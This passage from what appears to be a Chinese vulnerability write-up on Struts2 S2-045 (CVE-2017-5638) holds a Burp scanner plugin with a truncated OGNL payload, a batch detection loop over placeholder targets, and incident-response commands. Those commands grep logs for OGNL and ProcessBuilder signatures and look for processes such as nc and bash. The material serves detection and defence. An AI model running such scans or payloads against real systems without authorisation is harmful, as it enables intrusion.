java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">// S2-045检测插件框架</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">S2045Scanner</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">IScannerCheck</span> &#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    <span class=\"hljs-keyword\">public</span> List&lt;IScanIssue&gt; <span class=\"hljs-title function_\">doActiveScan</span><span class=\"hljs-params\">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> &#123;<br>        <span class=\"hljs-comment\">// 构造S2-045 payload</span><br>        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">payload</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;)...&#125;&quot;</span>;<br>        <br>        <span class=\"hljs-comment\">// 发送测试请求</span><br>        <span class=\"hljs-type\">byte</span>[] checkRequest = insertionPoint.buildRequest(payload.getBytes());<br>        <span class=\"hljs-type\">IHttpRequestResponse</span> <span class=\"hljs-variable\">checkRequestResponse</span> <span class=\"hljs-operator\">=</span> callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);<br>        <br>        <span class=\"hljs-comment\">// 分析响应判断是否存在漏洞</span><br>        <span class=\"hljs-keyword\">if</span> (isVulnerable(checkRequestResponse)) &#123;<br>            <span class=\"hljs-keyword\">return</span> Collections.singletonList(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">CustomScanIssue</span>(<span class=\"hljs-comment\">/* ... */</span>));<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"批量检测脚本\"><a href=\"#批量检测脚本\" class=\"headerlink\" title=\"批量检测脚本\"></a>批量检测脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/bash</span><br><span class=\"hljs-comment\"># S2-045批量检测脚本</span><br><br>targets=(<br>    <span class=\"hljs-string\">&quot;http://target1.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target2.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target3.com:8080&quot;</span><br>)<br><br><span class=\"hljs-keyword\">for</span> target <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;targets[@]&#125;</span>&quot;</span>; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Testing: <span class=\"hljs-variable\">$target</span>&quot;</span><br>    python3 s2-045-check.py <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$target</span>&quot;</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;---&quot;</span><br><span class=\"hljs-keyword\">done</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"应急响应指南\"><a href=\"#应急响应指南\" class=\"headerlink\" title=\"应急响应指南\"></a>应急响应指南</h2><h3 id=\"1-漏洞确认\"><a href=\"#1-漏洞确认\" class=\"headerlink\" title=\"1. 漏洞确认\"></a>1. 漏洞确认</h3><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\"># 检查Struts2版本<br><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/ -name &quot;struts2-core-*.jar&quot; 2&gt;/</span>dev/<span class=\"hljs-keyword\">null</span><br><br># 检查访问日志中的攻击特征<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;Content-Type.*%\\&#123;&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/apache2/</span>access.log<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;ognl|ProcessBuilder|Runtime&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/tomcat/</span>catalina.out<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-应急处置\"><a href=\"#2-应急处置\" class=\"headerlink\" title=\"2. 应急处置\"></a>2. 应急处置</h3><figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"># 临时阻断攻击IP<br>iptables -A <span class=\"hljs-keyword\">INPUT</span> -s &lt;攻击IP&gt; -j <span class=\"hljs-keyword\">DROP</span><br><br># 停止相关服务<br>systemctl <span class=\"hljs-keyword\">stop</span> tomcat<br>systemctl <span class=\"hljs-keyword\">stop</span> apache2<br><br># 备份系统状态<br>tar -czf /tmp/system_backup_$(date +<span class=\"hljs-title function_\">%Y</span><span class=\"hljs-title function_\">%m</span><span class=\"hljs-title function_\">%d_</span><span class=\"hljs-title function_\">%H</span><span class=\"hljs-title function_\">%M</span><span class=\"hljs-title function_\">%S</span>).tar.gz /var/log /etc /opt/tomcat<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-痕迹清理检查\"><a href=\"#3-痕迹清理检查\" class=\"headerlink\" title=\"3. 痕迹清理检查\"></a>3. 痕迹清理检查</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\"># 检查是否有异常进程<br><span class=\"hljs-keyword\">ps</span> aux | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;nc|bash|sh|python|perl&quot;</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span><br><br># 检查网络连接<br>netstat -antlp | <span class=\"hljs-keyword\">grep</span> ESTABLISHED<br><br># 检查新增文件<br><span class=\"hljs-keyword\">find</span> /tmp /var/tmp -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -mtime -<span class=\"hljs-number\">1</span><br><span class=\"hljs-keyword\">find</span> /<span class=\"hljs-keyword\">opt</span>/tomcat/webapps -name <span class=\"hljs-string\">&quot;*.jsp&quot;</span> -mtime -<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>Struts2-045漏洞的特点：</p>\n<h3 id=\"优势（从攻击者角度）\"><a href=\"#优势（从攻击者角度）\" class=\"headerlink\" title=\"优势（从攻击者角度）\"></a>优势（从攻击者角度）</h3><ul>\n<li><strong>利用简单</strong>: 只需构造HTTP请求头即可</li>\n<li><strong>影响面广</strong>: 大量企业级应用使用Struts2框架</li>\n<li><strong>检测困难</strong>: 攻击流量可能被忽略</li>\n<li><strong>危害严重</strong>: 直接获得服务器执行权限</li>\n</ul>\n<h3 id=\"防护要点\"><a href=\"#防护要点\" class=\"headerlink\" title=\"防护要点\"></a>防护要点</h3><ul>\n<li><strong>及时更新</strong>: 升级到安全版本是根本解决方案</li>\n<li><strong>深度防御</strong>: 结合WAF、IDS等多层防护</li>\n<li><strong>监控告警</strong>: 建立有效的安全监控体系</li>\n<li><strong>应急响应</strong>: 制定完善的安全事件响应流程</li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n<p><strong>参考资源</strong>:</p>\n<ul>\n<li><a href=\"https://struts.apache.org/announce.html#a20170307\">Apache Struts2官方安全公告</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\">CVE-2017-5638详细信息</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten/\">OWASP Struts2安全指南</a></li>\n</ul>\n",
            "tags": [
                "Web安全",
                "漏洞复现",
                "Struts2",
                "RCE",
                "OGNL注入"
            ]
        }
    ]
}